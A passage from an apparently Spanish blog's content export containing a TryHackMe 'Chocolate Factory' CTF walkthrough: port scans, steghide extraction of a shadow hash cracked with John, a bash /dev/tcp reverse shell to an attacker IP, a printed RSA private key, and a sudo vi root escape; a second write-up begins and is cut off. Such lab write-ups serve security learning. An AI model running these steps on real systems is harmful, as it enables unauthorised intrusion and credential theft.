113,114,115,116,117,118,119,120,121,122,123,124,125 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p21,22,80,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125 -sV -sC 10.10.250.47 -oN target PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-rw-r-- 1 1000 1000 208838 Sep 30 2020 gum_room.jpg | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.10.10.10 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 1 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 1631bbfb51fcccc12148ff0d833b0089b (RSA) | 256 e71fc9dbj3eaa44b672103ceedb1d3390 (ECDSA) |_ 256 b44502b62478gea9065f6c79448a06555e (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). 100/tcp open newacct? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 101/tcp open hostname? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 102/tcp open iso-tsap? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 103/tcp open gppitnp? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 104/tcp open acr-nema? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 105/tcp open csnet-ns? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 106/tcp open pop3pw? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 107/tcp open rtelnet? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 108/tcp open snagas? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 109/tcp open pop2? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 110/tcp open pop3? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 111/tcp open rpcbind? | fingerprint-strings: | NULL, RPCCheck: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 112/tcp open mcidas? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 113/tcp open ident? | fingerprint-strings: | DNSStatusRequestTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, NCP, NULL, RPCCheck, SMBProgNeg, TerminalServerCookie, oracle-tns: |_ http://localhost/key_rev_key \u0026lt;- You will find the key here!!! 114/tcp open audionews? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 115/tcp open sftp? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 116/tcp open ansanotify? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 117/tcp open uucp-path? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 118/tcp open sqlserv? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 119/tcp open nntp? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 120/tcp open cfdptkt? | fingerprint-strings: | GetRequest, HTTPOptions: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 121/tcp open erpc? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 122/tcp open smakynet? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 123/tcp open ntp? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 124/tcp open ansatrader? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 125/tcp open locus-map? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; Parámetro Función -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos Puerto 80 Con el whatweb podemos ver más información de la web\n❯ whatweb 10.10.250.47 http://10.10.250.47 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.250.47], PasswordField[password] Al entrar a la web hay un panel de login, e probado con admin:admin y las típicas credenciales pero nada.\nEl wappalayzer no reporta nada interesante.\nPuerto 21 El nmap reporto que se podía entrar al puerto 21 como anónimo (ftp-anon: Anonymous FTP login allowed)\n❯ ftp 10.10.250.47 Connected to 10.10.250.47. 220 (vsFTPd 3.0.3) Name (10.10.250.47:d3b0): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; Dentro solo hay una foto gum_room.jpg, con get gum_room.jpg nos la podemos pasar a nuestra máquina, la foto es la siguiente:\nPara ver si hay algo oculto en la foto usamos steghide\nSteghide es un software de esteganografía de código abierto que permite ocultar un archivo secreto en un archivo de imagen o audio.\nNo notarás ningún cambio en la imagen o el archivo de audio. Sin embargo, el archivo secreto estará dentro de la imagen original o el archivo de audio. Es un software de línea de comando.\n#Si no tienes instalado el \u0026#34;steghide\u0026#34; lo puedes descargar con sudo apt install steghide ❯ steghide extract -sf gum_room.jpg Anotar salvoconducto: anot� los datos extra�dos e/\u0026#34;b64.txt\u0026#34;. Ahora se a creado un archivo b64.txt que está encriptado con base64\ncat b64.txt | base64 -d \u0026gt; decode.txt Ahora en el decode.txt ya está el contenido\n... ... charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7::: Esto parece ser el /etc/shadow\nEl fichero /etc/shadow almacena las contraseñas de las cuentas de usuario. Se utiliza este fichero por seguridad. /etc/shadow es un archivo de texto que contiene información sobre las contraseñas de los usuarios del sistema. Es propiedad del usuario root y del grupo oculto\nAl final de todo se puede ver el usuario charlie, junto a un hash sha512 (se puede saber que tipo es porque empieza con $6$)\nPara romper el hash vamos a usar John the Ripper, que es una herramienta para recuperación de contraseñas. Originalmente desarrollado para el sistema operativo Unix\nsudo apt install john echo \u0026#34;hash\u0026#34; \u0026gt; myhash.hash john --wordlist=/usr/share/wordlists/rockyou.txt mihash.hash john --show mihash.hash home.php Esto nos devuelve el usuario charlie con la contraseña, al probarlos en la web, nos lleva a otra página.\nDesde aquí se pueden ejecutar comandos a la máquina víctima.\nReverse shell Primero nos ponemos en escucha por el puerto 443\nnc -nlvp 443 Intentamos crear una reverse shell mandando bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/443 0\u0026gt;\u0026amp;1, pero no recibimos nada, probamos añadiendo (bash -c \u0026ldquo;\u0026rdquo;) de tal forma que quede así bash -c \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/443 0\u0026gt;\u0026amp;1\u0026quot; Ahora ya si\nTratamiento de la tty Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm Escalada a charlie En el /home/charlie hay un user.txt, pero no tenemos acceso para leerlo. Hay un archivo llamado teleport ahí hay una RSA private key.\nUna llave RSA es una llave generada por el algoritmo RSA. Esta llave está compuesta por dos partes, una parte pública y otra parte privada.\nDesde nuestra máquina guardamos esa key en un archivo llamado id_rsa\n❯ cat id_rsa ───────┬────────────────────────────────────────────────────────────────────────────────── │ File: id_rsa ───────┼────────────────────────────────────────────────────────────────────────────────── 1 │ -----BEGIN RSA PRIVATE KEY----- 2 │ MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW 3 │ 1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb 4 │ L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj 5 │ B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY 6 │ fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE 7 │ RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej 8 │ Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9 9 │ zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF 10 │ w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl 11 │ kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ 12 │ j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2 13 │ EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T 14 │ RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF 15 │ uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA 16 │ KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ 17 │ RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19 18 │ znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB 19 │ la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB 20 │ FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg 21 │ 82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK 22 │ 37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv 23 │ ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb 24 │ Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM 25 │ Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm 26 │ G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln 27 │ -----END RSA PRIVATE KEY----- ───────┴────────────────────────────────────────────────────────────────────────────────── Ahora nos podemos conectar por ssh como charlie\nssh -i id_rsa charlie@10.10.94.87 Ya somos charlie y podemos ver la flag de usuario\nEscalada root Con sudo -l podemos ver todos los comandos que charlie puede ejecutar. Ahí podemos ver que el /usr/bin/vi lo puede ejecutar con sudo sin proporcionar contraseña\nvi (Visual) es un programa que entra en la categoría de los editores de texto, pues a diferencia de un procesador de texto no ofrece herramientas para determinar visualmente cómo quedará el documento impreso. Por esto carece de opciones como centrado o justificación de párrafos, pero permite mover, copiar, eliminar o insertar caracteres con mucha versatilidad. Este tipo de programas es frecuentemente utilizado por programadores para escribir código.\nEjecutar vi como root\nsudo vi\nctrl + c\nY por último escribir :shell en la linea de abajo\n:shell\n¡Ya somos root!\nroot.py (Puertos 100 - 125) En el directorio /root hay un archivo llamado root.py el cual al ejecutarlo pyhton root.py pide una key: Volviendo al nmap que encontró 25 puertos tcp en los cuales todos pone lo mismo:\n\u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; Menos uno, el 113, que pone:\nhttp://localhost/key_rev_key \u0026lt;- You will find the key here!!! Cuando entramos al http://10.10.94.87/key_rev_key nos descarga un archivo llamado key_rev_key, al abrirlo nos pide un nombre, e probado con charlie, Mr.Wonka, root, admin, etc\u0026hellip; pero nada.\nchmod +x key_rev_key ❯ ./key_rev_key Enter your name: charlie Bad name! Al hacer un nano al archivo hay una línea que pone:\ncongratulations you have found the key: ^@^@^@^@b\u0026#39;-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=\u0026#39;^@` ¡Ya tenemos la key!\nTambién hay otra línea en la cual se puede ver el nombre correcto\nEnter your name: \u0000%s\u0000 laksdhfas\u0000\u0000 ❯ ./key_rev_key Enter your name: laksdhfas congratulations you have found the key: b\u0026#39;-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=\u0026#39; Keep its safe Root flag Ahora ya podemos ejecutar el root.py que está en /root y poner la key.\n¡Nos responde con la flag de root!\n","date":"2022-12-13","id":143,"permalink":"/writeups/tryhackme/chocolate-factory/","summary":"Un ctf temática de Charlie y la fábrica de chocolate, vuelve a visitar la fábrica de chocolate de Willy Wonka.","tags":["CTF","Fácil","Linux","Archivos ocultos","vi","hash sha512"],"title":"Chocolate Factory"},{"content":"","date":"2022-12-13","id":144,"permalink":"/tags/hash-sha512/","summary":"","tags":[],"title":"hash sha512"},{"content":"","date":"2022-12-13","id":145,"permalink":"/tags/vi/","summary":"","tags":[],"title":"vi"},{"content":"Un ctf para principiantes, me puedes rootear?\nhttps://tryhackme.com/room/rrootme\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.108.243\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.108.243 PING 10.10.108.243 (10.10.108.243) 56(84) bytes of data. 64 bytes from 10.10.108.243: icmp_seq=1 ttl=63 time=77.9 ms --- 10.10.108.243 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 77.935/77.935/77.935/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.108.243 -oG allPort Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPort ───────┬──────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼──────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.108.243 5 │ [*] Open ports: 22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴──────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p22,80 -sC -sV 10.10.108.243 -oN target PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4ab916884c25448ba5cfd3f2252214 (RSA) | 256 a9a686e8ec963f003cd16d54973082 (ECDSA) |_ 256 22f6b5a654d9787c26035a953f9dfcd (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: HackIT - Home | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set Web Con el whateb podemos ver info sobre a web\n❯ whatweb 10.10.108.243 http://10.10.108.243 [200 OK] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.108.243], Script, Title[HackIT - Home] Al entrar a la web solo se ve texto\nBuscando subdirectorios (wfuzz) 